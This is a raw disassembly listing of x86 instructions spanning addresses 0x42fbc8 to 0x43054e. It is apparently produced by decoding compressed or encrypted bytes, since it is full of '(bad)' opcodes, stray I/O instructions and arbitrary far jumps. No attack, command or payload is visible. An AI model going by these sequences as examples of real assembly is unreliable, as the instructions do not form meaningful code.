  42fbc8:	or     edi,esp
  42fbca:	icebp  
  42fbcb:	inc    esi
  42fbcc:	retf   0x4ddb
  42fbcf:	push   eax
  42fbd0:	sti    
  42fbd1:	and    eax,0x95d82627
  42fbd6:	std    
  42fbd7:	dec    edx
  42fbd8:	jmp    0x42fb96
  42fbda:	fcomp  DWORD PTR [eax+esi*1+0x2f]
  42fbde:	mov    gs,WORD PTR [ecx+0x19]
  42fbe1:	mov    edx,0x42476e4e
  42fbe6:	(bad)  
  42fbe7:	(bad)  
  42fbe8:	loope  0x42fb83
  42fbea:	xlat   BYTE PTR ds:[ebx]
  42fbeb:	imul   edx,DWORD PTR [esi-0x41],0xffffff87
  42fbef:	stc    
  42fbf0:	xchg   ecx,eax
  42fbf1:	pop    esp
  42fbf2:	ficom  DWORD PTR [ebp+0x70]
  42fbf5:	mov    bh,0xae
  42fbf7:	loop   0x42fc1e
  42fbf9:	loop   0x42fb9d
  42fbfb:	mov    ch,0x74
  42fbfd:	(bad)  
  42fbfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fbff:	dec    esp
  42fc00:	cdq    
  42fc01:	adc    eax,0xbced5a22
  42fc06:	lock mov al,0xa9
  42fc09:	out    dx,al
  42fc0a:	aas    
  42fc0b:	pop    es
  42fc0c:	cmp    ah,cl
  42fc0e:	hlt    
  42fc0f:	or     eax,0x3e
	...
  42fc74:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fc7a:	mov    ebx,0x36325e9a
  42fc7f:	and    BYTE PTR [edi-0xf],dl
  42fc82:	mov    esi,0x200a9d4
  42fc87:	add    BYTE PTR ds:0x83000001,al
  42fc8d:	test   al,0x5a
  42fc8f:	iret   
  42fc90:	jb     0x42fc14
  42fc92:	or     eax,0x2148e8b7
  42fc97:	test   BYTE PTR [edx],cl
  42fc99:	scas   al,BYTE PTR es:[edi]
  42fc9a:	dec    ecx
  42fc9b:	out    0xfb,al
  42fc9d:	or     DWORD PTR [ecx-0x46f53b57],edx
  42fca3:	mov    bh,0x1b
  42fca5:	and    al,0x19
  42fca7:	mov    ecx,0x4727f3f0
  42fcac:	push   cs
  42fcad:	xchg   esi,eax
  42fcae:	sbb    eax,0xa2fc81d4
  42fcb3:	out    dx,al
  42fcb4:	arpl   ax,cx
  42fcb6:	ds cmc 
  42fcb8:	lock fsubr QWORD PTR [ecx-0x4714a5db]
  42fcbf:	mov    al,0x81
  42fcc1:	adc    DWORD PTR [eax+0x50],0xa38923c
  42fcc8:	retf   0x6986
  42fccb:	sbb    al,0x26
  42fccd:	ret    0x1adc
  42fcd0:	out    dx,al
  42fcd1:	fwait
  42fcd2:	jecxz  0x42fd0c
  42fcd4:	lea    ecx,[ecx+0x5e]
  42fcd7:	xor    esi,edi
  42fcd9:	outs   dx,DWORD PTR ds:[esi]
  42fcda:	int    0xec
  42fcdc:	sub    eax,0x5fe94789
  42fce1:	mov    ah,BYTE PTR [eax]
  42fce3:	mov    ds:0xc08d3eff,al
  42fce8:	add    eax,DWORD PTR [ecx-0x18]
  42fceb:	je     0x42fd4c
  42fced:	into   
  42fcee:	or     eax,0xc062958d
  42fcf3:	pop    edi
  42fcf4:	mov    es:0x9176e5e2,al
  42fcfa:	out    dx,eax
  42fcfb:	aad    0x29
  42fcfd:	mov    ah,0xee
  42fcff:	(bad)  
  42fd00:	fdiv   QWORD PTR [ebx-0x65]
  42fd03:	mov    eax,ds:0x6f9c7eee
  42fd08:	dec    ebx
  42fd09:	jge    0x42fcbe
  42fd0b:	jg     0x42fcad
  42fd0d:	iret   
  42fd0e:	push   edi
  42fd0f:	adc    edx,DWORD PTR [edx+0x1f]
  42fd12:	test   eax,0xa7eaa2ec
  42fd17:	int    0x34
  42fd19:	sti    
  42fd1a:	clc    
  42fd1b:	sub    ah,bl
  42fd1d:	xchg   edx,eax
  42fd1e:	mov    edx,es
  42fd20:	xchg   edx,eax
  42fd21:	jp     0x42fd03
  42fd23:	loopne 0x42fd1d
  42fd25:	pop    esi
  42fd26:	pushf  
  42fd27:	shr    BYTE PTR [eax],cl
  42fd29:	fild   WORD PTR [edx+0x1ef0ae57]
  42fd2f:	enter  0xbec7,0x4f
  42fd33:	(bad)  
  42fd34:	aam    0x9
  42fd36:	add    ebp,DWORD PTR [ebx+0x80b2fb1]
  42fd3c:	and    esi,DWORD PTR [ecx-0x68]
  42fd3f:	loop   0x42fd23
  42fd41:	mov    ebx,0xf5a0b37
  42fd46:	mov    esi,0x867888e5
  42fd4b:	mov    DWORD PTR [ebx-0x33],edx
  42fd4e:	mov    eax,0x246fd2b4
  42fd53:	nop
  42fd54:	or     ch,BYTE PTR [esi]
  42fd56:	push   ds
  42fd57:	xor    eax,edi
  42fd59:	sub    ebx,DWORD PTR [esi+0x71f89784]
  42fd5f:	jae    0x42fcff
  42fd61:	push   0x322c9d8
  42fd66:	add    eax,0xb18bc5d5
  42fd6b:	loopne 0x42fd3a
  42fd6d:	test   BYTE PTR ds:0xaed56e31,ch
  42fd73:	loope  0x42fdd4
  42fd75:	and    al,0xbe
  42fd77:	jg     0x42fdb6
  42fd79:	jecxz  0x42fde0
  42fd7b:	fdivr  st,st(7)
  42fd7d:	xchg   edi,eax
  42fd7e:	aas    
  42fd7f:	lods   al,BYTE PTR ds:[esi]
  42fd80:	dec    edi
  42fd81:	inc    ebp
  42fd82:	jmp    FWORD PTR [ebx+0xc]
  42fd85:	or     al,0x39
  42fd87:	jns    0x42fdcd
  42fd89:	fld    DWORD PTR [ecx-0x37442522]
  42fd8f:	out    dx,al
  42fd90:	scas   eax,DWORD PTR es:[edi]
	...
  42fdf1:	add    BYTE PTR [eax],al
  42fdf3:	add    BYTE PTR [eax-0x40],cl
  42fdf6:	ret    0xcaf0
  42fdf9:	bnd jp 0x42fdf4
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz (bad) 
  42fe01:	out    0x0,al
  42fe03:	in     eax,dx
  42fe04:	scas   al,BYTE PTR es:[edi]
  42fe05:	add    DWORD PTR [edx],eax
  42fe07:	add    BYTE PTR ds:0x1e000001,al
  42fe0d:	rcr    BYTE PTR [eax-0x3da7080a],0xc2
  42fe14:	ret    
  42fe15:	push   ebx
  42fe16:	adc    al,0x8c
  42fe18:	jb     0x42fe51
  42fe1a:	push   esi
  42fe1b:	mov    al,ds:0x1eb33a13
  42fe20:	dec    eax
  42fe21:	mov    gs,ebx
  42fe23:	(bad)  
  42fe24:	mov    ch,0x8
  42fe26:	js     0x42fdee
  42fe28:	lock ins DWORD PTR es:[edi],dx
  42fe2a:	jbe    0x42fe0c
  42fe2c:	test   al,0xf0
  42fe2e:	pop    esp
  42fe2f:	cmp    al,bh
  42fe31:	inc    ebx
  42fe32:	dec    ecx
  42fe33:	pop    esi
  42fe34:	sub    ch,BYTE PTR [edi]
  42fe36:	sbb    al,0xc4
  42fe38:	mov    al,ds:0x446b5f4b
  42fe3d:	es pop ebx
  42fe3f:	xchg   DWORD PTR [ebx],ecx
  42fe41:	out    dx,eax
  42fe42:	out    dx,al
  42fe43:	dec    BYTE PTR [eax-0x5575bac9]
  42fe49:	xchg   esp,eax
  42fe4a:	mov    ds:0x86fdb567,al
  42fe4f:	mov    bl,0xdc
  42fe51:	(bad)  
  42fe53:	aas    
  42fe54:	(bad)  
  42fe55:	jbe    0x42fe18
  42fe57:	shl    DWORD PTR [ecx+eiz*4+0x66],0xd9
  42fe5c:	je     0x42fe53
  42fe5e:	xchg   ecx,eax
  42fe5f:	jmp    0x42fe89
  42fe61:	mov    ds:0xee54e887,al
  42fe66:	xor    ch,BYTE PTR [esi+0x2]
  42fe69:	xor    bl,BYTE PTR [ebx]
  42fe6b:	jae    0x42feea
  42fe6d:	out    dx,eax
  42fe6e:	std    
  42fe6f:	jne    0x42fe52
  42fe71:	adc    edi,DWORD PTR [ecx]
  42fe73:	pop    eax
  42fe74:	nop
  42fe75:	fwait
  42fe76:	mov    ebp,0x1fcd8c7d
  42fe7b:	dec    ebp
  42fe7c:	loopne 0x42fe0a
  42fe7e:	sbb    dl,BYTE PTR [edi+0x7e]
  42fe81:	je     0x42fe0e
  42fe83:	pop    eax
  42fe84:	push   esp
  42fe85:	and    al,0x4
  42fe87:	sbb    al,0x6f
  42fe89:	out    0x1d,eax
  42fe8b:	cmp    dl,BYTE PTR [esi-0x24]
  42fe8e:	adc    dh,cl
  42fe90:	retf   
  42fe91:	and    edi,ebp
  42fe93:	push   eax
  42fe94:	mov    cl,0xbe
  42fe96:	loope  0x42fe4f
  42fe98:	adc    cl,dh
  42fe9a:	je     0x42ff16
  42fe9c:	or     esp,edi
  42fe9e:	pop    eax
  42fe9f:	ret    
  42fea0:	shr    DWORD PTR [ecx],cl
  42fea2:	and    dh,ch
  42fea4:	pop    eax
  42fea5:	gs jno 0x42fe82
  42fea8:	(bad)  
  42fea9:	and    eax,0xbfa13e82
  42feae:	adc    DWORD PTR [edi-0x17b7b2df],esp
  42feb4:	xchg   edx,eax
  42feb5:	or     DWORD PTR [edx+0x9],esp
  42feb8:	out    0x60,eax
  42feba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42febb:	xchg   edi,eax
  42febc:	int3   
  42febd:	dec    esi
  42febe:	push   0x56d6de18
  42fec3:	push   0xffffffb3
  42fec5:	and    ah,dh
  42fec7:	mov    edi,0xbd8e993d
  42fecc:	mov    bl,0xbe
  42fece:	push   esp
  42fecf:	dec    ecx
  42fed0:	xchg   esi,eax
  42fed1:	aas    
  42fed2:	int    0x39
  42fed4:	and    al,al
  42fed6:	fsubr  QWORD PTR [esi+0x5bc7b42a]
  42fedc:	retf   0xf17f
  42fedf:	xchg   edx,eax
  42fee0:	retf   0x5e91
  42fee3:	mov    eax,ds:0x8acb8550
  42fee8:	jne    0x42ff1a
  42feea:	lods   al,BYTE PTR ds:[esi]
  42feeb:	add    ebx,DWORD PTR [ecx+0x59b406eb]
  42fef1:	ins    DWORD PTR es:[edi],dx
  42fef2:	cdq    
  42fef3:	jmp    0xecb1a7df
  42fef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fef9:	and    al,0xe
  42fefb:	mov    bl,0xa0
  42fefd:	sbb    BYTE PTR fs:[eax+0xc],ah
  42ff01:	adc    DWORD PTR [edx+ecx*4],edx
  42ff04:	inc    ebp
  42ff05:	test   DWORD PTR ds:0x60789379,ebp
  42ff0b:	sub    al,0x1
  42ff0d:	aaa    
  42ff0e:	dec    BYTE PTR [esp+eiz*8]
	...
  42ff71:	add    BYTE PTR [eax],al
  42ff73:	add    BYTE PTR [edi+eiz*2],al
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [ecx+ebx*8+0x64],0x85
  42ff83:	cmp    eax,0x202b3
  42ff88:	add    eax,0x9f000001
  42ff8d:	cmc    
  42ff8e:	iret   
  42ff8f:	les    edi,FWORD PTR [edi-0x7e297478]
  42ff95:	repz enter 0x4f09,0x55
  42ff9a:	mov    dh,0x9b
  42ff9c:	dec    edx
  42ff9d:	test   DWORD PTR [ebx],ebx
  42ff9f:	loope  0x42ffd5
  42ffa1:	mov    ebx,0xbe02e671
  42ffa6:	cli    
  42ffa7:	setl   BYTE PTR [esi-0x252e09eb]
  42ffae:	inc    esi
  42ffaf:	dec    ebx
  42ffb0:	stos   DWORD PTR es:[edi],eax
  42ffb1:	push   esi
  42ffb2:	mov    cl,0xd7
  42ffb4:	rol    BYTE PTR [edi],0x7e
  42ffb7:	mov    al,ds:0x4c9fb073
  42ffbc:	aaa    
  42ffbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ffbe:	push   esp
  42ffbf:	fld    TBYTE PTR [ebp+0x27]
  42ffc2:	mov    DWORD PTR ds:0x72d1d501,esi
  42ffc8:	sub    bl,BYTE PTR ds:0x67e8e5a4
  42ffce:	(bad)  
  42ffd0:	or     eax,0x94480fa9
  42ffd5:	fldenv [eax+0x6752b8b6]
  42ffdb:	cmc    
  42ffdc:	aam    0x41
  42ffde:	jae    0x430040
  42ffe0:	inc    edx
  42ffe1:	outs   dx,BYTE PTR ds:[esi]
  42ffe2:	or     cl,BYTE PTR [edi]
  42ffe4:	xor    edi,DWORD PTR [ecx+0x1a7cb40f]
  42ffea:	fnsave [edi-0x647e65df]
  42fff0:	jge    0x42fffe
  42fff2:	jp     0x430047
  42fff4:	mov    eax,ss
  42fff6:	xchg   edi,eax
  42fff7:	int3   
  42fff8:	adc    BYTE PTR [esi-0x34],cl
  42fffb:	shl    BYTE PTR [ecx],1
  42fffd:	dec    esi
  42fffe:	xchg   ebx,eax
  42ffff:	bound  ecx,QWORD PTR [ebx-0x33]
  430002:	adc    bh,BYTE PTR [esi+0x29]
  430005:	jmp    0x2b79d235
  43000a:	dec    edx
  43000b:	lods   eax,DWORD PTR ds:[esi]
  43000c:	pop    es
  43000d:	fs aas 
  43000f:	icebp  
  430010:	xor    ah,BYTE PTR [eax]
  430012:	or     DWORD PTR [ecx],ecx
  430014:	cmp    al,0x3
  430016:	cmp    BYTE PTR [edx+edi*2-0x56],ch
  43001a:	pop    ebx
  43001b:	jmp    0x17ba:0xa3f9e59e
  430022:	sbb    eax,0x9787f898
  430027:	pop    ds
  430028:	sub    bh,BYTE PTR [edx]
  43002a:	call   0x880f:0xd985d410
  430031:	lea    esi,[ebx-0x6c6bcd]
  430037:	sti    
  430038:	add    al,cl
  43003a:	mov    cl,0x7c
  43003c:	and    esp,edx
  43003e:	je     0x42ffcd
  430040:	jge    0x4300b5
  430042:	in     eax,dx
  430043:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430044:	sbb    dl,BYTE PTR [ecx]
  430046:	mov    dh,dh
  430048:	(bad)  
  430049:	push   ebp
  43004a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43004b:	daa    
  43004c:	mov    al,ds:0xfd4cd69d
  430051:	(bad)  
  430052:	pop    ebp
  430053:	sbb    al,0x2b
  430055:	mov    ebp,0x410687f2
  43005a:	lods   al,BYTE PTR ds:[esi]
  43005b:	out    dx,eax
  43005c:	push   ebp
  43005d:	add    BYTE PTR [ecx-0x7e39fe69],cl
  430063:	or     DWORD PTR [ebx+0x2a],esi
  430066:	enter  0x81e3,0x54
  43006a:	sub    al,0x74
  43006c:	jns    0x4300d1
  43006e:	into   
  43006f:	jecxz  0x4300e8
  430071:	xchg   edi,eax
  430072:	sub    dl,BYTE PTR [edx]
  430074:	(bad)  
  430075:	(bad)  
  430077:	push   edi
  430078:	mov    bh,BYTE PTR [esi-0x49]
  43007b:	push   0xffffffa7
  43007d:	pushw  0x345d
  430081:	jae    0x4300ed
  430083:	imul   ebp,DWORD PTR [ecx-0x51061178],0xf30a4cba
  43008d:	sub    al,0xb7
  43008f:	lock popa 
	...
  4300f1:	add    BYTE PTR [eax],al
  4300f3:	add    bh,al
  4300f5:	ins    DWORD PTR es:[edi],dx
  4300f6:	aam    0xb5
  4300f8:	(bad)  
  4300f9:	mov    ebp,0x9547fe7
  4300fe:	scas   eax,DWORD PTR es:[edi]
  4300ff:	add    al,0xb5
  430101:	dec    ecx
  430102:	mov    edi,0x203b896
  430107:	add    BYTE PTR [eax+eax*1],dh
  43010a:	add    BYTE PTR [eax],al
  43010c:	stos   BYTE PTR es:[edi],al
  43010d:	push   ebp
  43010e:	stc    
  43010f:	mov    ds,WORD PTR [eax]
  430111:	test   al,0x91
  430113:	(bad)  
  430114:	arpl   WORD PTR ds:0xd8bda116,cx
  43011a:	jb     0x430184
  43011c:	(bad)  
  43011d:	test   eax,0x6c146d46
  430122:	mov    ebx,0x9798c533
  430127:	jns    0x4300aa
  430129:	int3   
  43012a:	sub    cl,BYTE PTR [eax+0x75]
  43012d:	out    dx,eax
  43012e:	call   0x4884:0x382e042
  430135:	aam    0x9a
  430137:	imul   esp,edx,0x3d
  43013a:	(bad)  
  43013b:	cwde   
  43013c:	repnz gs scas al,BYTE PTR es:[edi]
  43013f:	or     eax,DWORD PTR [eax]
	...
  430171:	add    BYTE PTR [eax],al
  430173:	add    BYTE PTR [ebp+0x55],cl
  430176:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  43017c:	mov    esp,ebp
  43017e:	or     ah,dh
  430180:	dec    ebp
  430181:	add    bh,al
  430183:	add    BYTE PTR [eax],cl
  430185:	add    BYTE PTR [eax],al
  430187:	mov    DWORD PTR [eax],0x40f44545
  43018d:	xor    DWORD PTR [eax],eax
  43018f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430195:	(bad)  
  430196:	enter  0x4d45,0xbc
  43019a:	mov    esi,DWORD PTR [edx]
  43019c:	hlt    
  43019d:	test   ebx,ecx
  43019f:	pushf  
  4301a0:	enter  0x4df8,0x8b
  4301a4:	mov    DWORD PTR [ebp+0x8],0x894708
  4301ab:	inc    ebp
  4301ac:	mov    ebp,0xff8bfffc
  4301b1:	dec    ebp
  4301b2:	mov    ch,0xf4
  4301b4:	call   DWORD PTR [ebx-0x1]
  4301b7:	mov    ebx,0x8005474
  4301bc:	call   DWORD PTR [ecx+0x8]
  4301bf:	pop    es
  4301c0:	jmp    0xb8:0xacb4533
  4301c7:	fwait
  4301c8:	mov    esi,DWORD PTR [edx-0xc]
  4301cb:	xor    cl,bl
  4301cd:	add    BYTE PTR [ebx+0x3c83203],bl
  4301d3:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  4301d9:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  4301df:	xor    eax,DWORD PTR [eax]
  4301e1:	retf   
  4301e2:	retf   
  4301e3:	add    ecx,eax
  4301e5:	enter  0x894d,0x64
  4301e9:	dec    ebp
  4301ea:	sbb    ah,cl
  4301ec:	add    BYTE PTR [ebx-0xb9bb277],cl
  4301f2:	dec    DWORD PTR [ebx-0xbcfb275]
  4301f8:	test   DWORD PTR [ebx],esi
  4301fa:	dec    ebx
  4301fc:	inc    DWORD PTR [ebx]
  4301fe:	inc    eax
  4301ff:	enter  0x8989,0x50
  430203:	(bad)  
  430204:	call   DWORD PTR [ebx+ecx*4-0x1]
  430208:	cld    
  430209:	dec    DWORD PTR [ebp-0xa90001]
  43020f:	push   edi
  430210:	mov    BYTE PTR [edx+0x1],ch
  430213:	and    al,BYTE PTR [eax]
  430215:	pop    ecx
  430216:	inc    ebp
  430217:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43021d:	push   0xffffff89
  43021f:	pop    ecx
  430220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430221:	dec    ebp
  430222:	add    BYTE PTR [ecx+0x45fc088b],cl
  430228:	jne    0x430274
  43022a:	lea    eax,[eax]
  43022c:	push   eax
  43022d:	(bad)  
  43022e:	dec    DWORD PTR [eax]
  430230:	mov    DWORD PTR [eax],eax
  430232:	test   al,0x0
  430234:	add    BYTE PTR [ebp-0x18],cl
  430237:	xor    ebp,DWORD PTR [ebx]
  430239:	add    eax,DWORD PTR [eax]
  43023b:	mov    eax,eax
  43023d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  430244:	inc    ebp
  430245:	mov    DWORD PTR [ebx+0x459408],ecx
  43024b:	arpl   WORD PTR [ebx-0x372749b],cx
  430251:	sub    al,0x80
  430253:	inc    DWORD PTR [ecx]
  430255:	lea    eax,[eax]
  430257:	or     al,0x0
  430259:	inc    DWORD PTR [ecx-0x18]
  43025c:	mov    ecx,DWORD PTR [ebx]
  43025e:	cld    
  43025f:	add    BYTE PTR [ecx+0x75014d],cl
  430265:	(bad)  
  430266:	xchg   ebp,eax
  430267:	fdivr  st,st(7)
  430269:	inc    eax
  43026a:	inc    DWORD PTR [eax]
  43026c:	mov    ecx,DWORD PTR [ebp-0x4]
  43026f:	xor    edx,DWORD PTR [edx+0x7201b8]
  430275:	add    BYTE PTR [edx],dl
  430277:	enter  0x4d90,0x0
  43027b:	mov    eax,DWORD PTR [eax]
  43027d:	hlt    
  43027e:	add    al,0xa5
  430280:	mov    al,0xff
  430282:	add    bh,bh
  430284:	add    BYTE PTR [ebx],dh
  430286:	inc    DWORD PTR [ebx]
  430288:	sbb    al,0x89
  43028a:	jne    0x430268
  43028c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430292:	mov    eax,DWORD PTR [ebp-0xff0048]
  430298:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43029f:	inc    DWORD PTR [ebp-0x75]
  4302a2:	fisttp QWORD PTR [esi+ebp*8]
  4302a5:	test   DWORD PTR [esi-0x1],esp
  4302a8:	inc    ebp
  4302a9:	(bad)  
  4302aa:	aas    
  4302ab:	inc    ebp
  4302ac:	(bad)  
  4302ad:	lea    edi,[esp+eiz*2-0x1]
  4302b1:	inc    edi
  4302b3:	mov    DWORD PTR ds:0x8000c7a0,edi
  4302b9:	mov    ebp,esp
  4302bb:	cld    
  4302bc:	loop   0x43024b
  4302be:	inc    ebp
  4302bf:	(bad)  
  4302c0:	out    dx,al
  4302c1:	(bad)  
  4302c2:	fisttp WORD PTR [eax+0x8801c7]
  4302c8:	jecxz  0x43030f
  4302ca:	in     al,dx
  4302cb:	inc    DWORD PTR [ebp-0x4]
  4302ce:	out    0x8d,eax
  4302d0:	aas    
  4302d1:	inc    edi
  4302d3:	jmp    FWORD PTR [eax-0x78]
  4302d6:	inc    DWORD PTR [ecx]
  4302d8:	mov    DWORD PTR [eax],0xc7043d
  4302de:	ins    BYTE PTR es:[edi],dx
  4302df:	test   edi,edi
  4302e1:	pandn  mm0,mm5
  4302e4:	aas    
  4302e5:	add    bh,al
  4302e7:	mov    esi,DWORD PTR [eax-0x4]
  4302ea:	inc    DWORD PTR [eax+0xdf01ee]
  4302f0:	(bad)  
  4302f1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4302f5:	mov    ebp,ebx
  4302f7:	xchg   esp,eax
  4302f8:	fild   DWORD PTR [eax]
  4302fa:	(bad)  
  4302fb:	mov    edi,DWORD PTR [eax+0x3]
  4302fe:	(bad)  
  4302ff:	cmp    al,0xe7
  430301:	dec    ebp
  430302:	leave  
  430303:	mov    ebp,eax
  430305:	fsubr  DWORD PTR [edx]
  430307:	add    BYTE PTR [eax],al
  430309:	lea    ecx,[ebx-0x7f0003b4]
  43030f:	push   edx
  430310:	add    DWORD PTR [ebp+0x0],edx
  430313:	mov    esi,DWORD PTR [eax]
  430315:	mov    WORD PTR [edi],ss
  430317:	add    BYTE PTR [eax],al
  430319:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43031f:	add    ah,bh
  430321:	push   0x7d
  430323:	dec    DWORD PTR [ebx+0xd88c]
  430329:	push   edx
  43032a:	mov    edx,DWORD PTR [ecx-0x4]
  43032d:	call   DWORD PTR [eax+0x7d01fc]
  430333:	mov    esi,DWORD PTR [esi]
  430335:	cld    
  430336:	add    BYTE PTR [eax+0x560150],dl
  43033c:	test   DWORD PTR [ebp+0x75],eax
  43033f:	loop   0x4302cc
  430341:	jmp    0xe38b:0x947dc7fc
  430348:	fsub   st,st(7)
  43034a:	add    bh,al
  43034c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  430352:	add    edi,edi
  430354:	add    bh,bh
  430356:	adc    al,0xed
  430358:	add    dh,ah
  43035a:	push   eax
  43035b:	inc    ebp
  43035c:	push   esi
  43035d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  430363:	test   BYTE PTR [ebx],dh
  430365:	out    0x5,al
  430367:	shl    BYTE PTR [edx+0x45],0x0
  43036b:	jmp    0x43032e
  43036d:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  430374:	inc    esi
  430375:	jle    0x430377
  430377:	test   edi,eax
  430379:	(bad)  
  43037a:	call   0x130047e
  43037f:	out    0x75,al
  430381:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430387:	in     al,dx
  430388:	mov    esp,edx
  43038a:	mov    ah,0x85
  43038c:	add    bh,bh
  43038e:	call   0x1292d92
  430393:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43039a:	add    ebx,esp
  43039c:	add    ah,ch
  43039e:	xor    BYTE PTR [ebp-0xff0073],al
  4303a4:	mov    ebx,ebp
  4303a6:	cld    
  4303a7:	jle    0x430332
  4303a9:	add    DWORD PTR gs:[eax],eax
  4303ac:	add    BYTE PTR [eax+0x1],dl
  4303af:	inc    ebp
  4303b0:	inc    ebp
  4303b1:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  4303b7:	dec    DWORD PTR [ebx-0x3fd80318]
  4303bd:	add    BYTE PTR [ebp-0xbf0040],dl
  4303c3:	inc    ebp
  4303c4:	fmul   QWORD PTR [ebx-0x4faf0400]
  4303ca:	inc    ebp
  4303cb:	add    DWORD PTR [ebx+0x459c00],ecx
  4303d1:	mov    edi,edi
  4303d3:	mov    eax,0xe80800ff
  4303d8:	inc    ebp
  4303d9:	sub    cl,BYTE PTR [ebx-0x47000400]
  4303df:	add    al,0x1
  4303e1:	rol    BYTE PTR [eax],0x1e
  4303e4:	jne    0x43042b
  4303e6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4303ec:	inc    DWORD PTR [ecx]
  4303ee:	call   0x882cf3
  4303f3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4303f9:	call   0x432dff
  4303fe:	xor    bh,bh
  430400:	push   edi
  430401:	adc    BYTE PTR [ebx-0x74741bbb],al
  430407:	fsub   st,st(4)
  430409:	ret    
  43040a:	loopne 0x4303a7
  43040c:	xor    DWORD PTR [edx],0x31
  43040f:	cmp    edi,edi
  430411:	bswap  eax
  430413:	rol    BYTE PTR gs:[eax],0x5
  430417:	jmp    0x12e0561
  43041c:	mov    eax,DWORD PTR [ebp-0x4]
  43041f:	add    BYTE PTR [eax+0xff0100],bh
  430425:	cld    
  430426:	jne    0x4304a5
  430428:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  43042e:	jb     0x430431
  430430:	add    BYTE PTR [eax],al
  430432:	push   eax
  430433:	fild   DWORD PTR [ebp+0x0]
  430436:	mov    edx,DWORD PTR [eax-0x68]
  430439:	inc    ebp
  43043a:	add    BYTE PTR [ebx+0xffa8ff],cl
  430440:	or     bh,bh
  430442:	inc    ebp
  430443:	call   0x1272b47
  430448:	jge    0x430497
  43044a:	adc    BYTE PTR [ebx+0x459cb9],cl
  430450:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  430456:	fwait
  430457:	mov    eax,0x30132
  43045c:	lea    esi,[ebp+0x2c]
  43045f:	xor    edi,edi
  430461:	(bad)  
  430462:	call   0x1422dcf
  430467:	call   0x1372df7
  43046c:	jne    0x4303f9
  43046e:	xor    edi,esp
  430470:	add    eax,DWORD PTR [eax+0xc018d]
  430476:	push   DWORD PTR [eax]
  430478:	call   0xcc2dd4
  43047d:	enter  0x45ff,0xe0
  430481:	mov    ecx,DWORD PTR [ebp-0x28]
  430484:	xor    eax,DWORD PTR [eax]
  430486:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43048c:	(bad)  
  43048d:	xchg   ebp,eax
  43048e:	call   0x1420592
  430493:	mov    cl,0x45
  430495:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43049b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  4304a2:	mov    edi,edi
  4304a4:	or     BYTE PTR [eax],cl
  4304a6:	inc    ebp
  4304a7:	test   DWORD PTR gs:[eax],eax
  4304aa:	je     0x4304f1
  4304ac:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  4304b2:	xor    edx,DWORD PTR [eax-0x73]
  4304b5:	push   ebp
  4304b6:	or     BYTE PTR [ebp+0x21007572],al
  4304bc:	inc    ebp
  4304bd:	loopne 0x43044a
  4304bf:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  4304c6:	int    0x0
  4304c8:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  4304ce:	inc    ebp
  4304cf:	push   ebp
  4304d0:	cmp    ebp,eax
  4304d2:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  4304d9:	cld    
  4304da:	fadd   QWORD PTR [eax+0x3b014d]
  4304e0:	jne    0x430512
  4304e2:	push   0xf8898557
  4304e7:	loopne 0x43055e
  4304e9:	inc    ebp
  4304ea:	lea    eax,[ebx+0x72e8e4cc]
  4304f0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4304f6:	jmp    0x43052b
  4304f8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4304fe:	xor    eax,edi
  430500:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43050a:	rcl    BYTE PTR [eax-0x40],1
  43050d:	inc    ebp
  43050e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430516:	inc    ebp
  430517:	xchg   ebp,eax
  430518:	ud0    ebp,DWORD PTR [ebx]
  43051b:	inc    DWORD PTR [eax]
  43051d:	daa    
  43051e:	jbe    0x430520
  430520:	mov    dl,BYTE PTR [eax-0x80]
  430523:	push   ebp
  430524:	pop    ds
  430525:	mov    ecx,DWORD PTR [esp+esi*8]
  430528:	inc    eax
  430529:	retf   
  43052a:	inc    ebp
  43052b:	iret   
  43052c:	jb     0x4304f6
  43052e:	mov    eax,DWORD PTR [edi]
  430530:	int3   
  430531:	inc    ebp
  430532:	inc    ebp
  430533:	add    DWORD PTR [ecx],esi
  430535:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  43053c:	xor    dh,BYTE PTR [ebx]
  43053e:	pushf  
  43053f:	lea    ecx,[ecx+0x4d72d808]
  430545:	add    BYTE PTR [ebx],dh
  430547:	inc    ebp
  430548:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  43054e:	xor    dl,BYTE PTR [edx]
